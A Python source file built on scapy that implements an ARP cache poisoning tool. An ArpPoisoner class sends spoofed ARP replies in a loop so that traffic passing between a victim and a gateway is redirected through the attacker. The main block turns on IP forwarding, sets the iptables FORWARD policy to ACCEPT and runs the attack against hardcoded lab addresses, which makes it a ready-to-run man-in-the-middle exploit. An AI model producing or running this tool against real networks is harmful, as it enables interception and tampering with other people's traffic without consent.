from scapy.all import *
import multiprocessing
import threading
import time
import os

class ArpPoisoner(multiprocessing.Process):

    def __init__(self, interface):

        multiprocessing.Process.__init__(self)

        self.interface = interface
        self.packets = []    #The packets which will be used to spoof

        self.exit = multiprocessing.Event()

    def add_packet(self, mac_attacker, mac_victim, ip_to_spoof, ip_victim):
        """"Creates an ARP packet that gets added to the packets list to be used for spoofing""" 
        
        #Initialize packet
        packet = Ether()/ARP()    
        #Set values for the mac and ip addresses
        packet[Ether].src = mac_attacker
        packet[ARP].hwsrc = mac_attacker
        packet[ARP].hwdst = mac_victim
        packet[ARP].psrc  = ip_to_spoof
        packet[ARP].pdst  = ip_victim

        self.packets.append(packet)

    def clear_packets(self):
        """Empties the packets list"""
        self.packets = []

    def run(self):
        """"Starts sending out the spoofing packets on the interface repeatedly. Will not stop by itself."""

        self.exit.clear()

        while not self.exit.is_set():
            
            for packet in self.packets:
                sendp(packet, iface = self.interface, verbose=0)
            
            time.sleep(2)

    def restore_arp(self, mac_attacker, mac_victim, ip_victim, mac_gateway, ip_gateway):
        """Restores arp addresses to their original pre-spoof state."""
        
        #Initialize restore packets
        restore_packet_gateway = Ether(src=mac_attacker)/ARP(op=2,hwsrc=mac_victim, hwdst=mac_gateway, psrc=ip_victim, pdst=ip_gateway)
        restore_packet_victim = Ether(src=mac_attacker)/ARP(op=2,hwsrc=mac_gateway, hwdst=mac_victim, psrc=ip_gateway, pdst=ip_victim) 

        sendp(restore_packet_gateway, iface = self.interface, verbose=0)
        sendp(restore_packet_victim, iface = self.interface, verbose=0)
    
        print "Restored ARP tables"

    def stop(self):
        """Stops the sending of the spoofing packets."""
        self.exit.set()

def test_cb():

    arp_poisoner = ArpPoisoner("enp0s10")

    mac_attacker = "08:00:27:52:b1:13"
    mac_victim = "08:00:27:69:ca:f1"
    mac_gateway = "52:54:00:12:35:00"

    ip_attacker = "10.0.123.5"
    ip_victim = "10.0.123.4"
    ip_gateway = "10.0.123.1"

    # Create packet to send to victim
    arp_poisoner.add_packet(mac_attacker, mac_victim, ip_gateway, ip_victim)

    # Create packet to send to gateway
    arp_poisoner.add_packet(mac_attacker, mac_gateway, ip_victim, ip_gateway)

    arp_poisoner.start()
    arp_poisoner.run()
    time.sleep(10)
    arp_poisoner.stop()

def test():

    thread = threading.Thread(target=test_cb)
    thread.run()

if __name__ == "__main__":

    import os
    os.system("sysctl -w net.ipv4.ip_forward=1")
    os.system("iptables -P FORWARD ACCEPT")

    test()
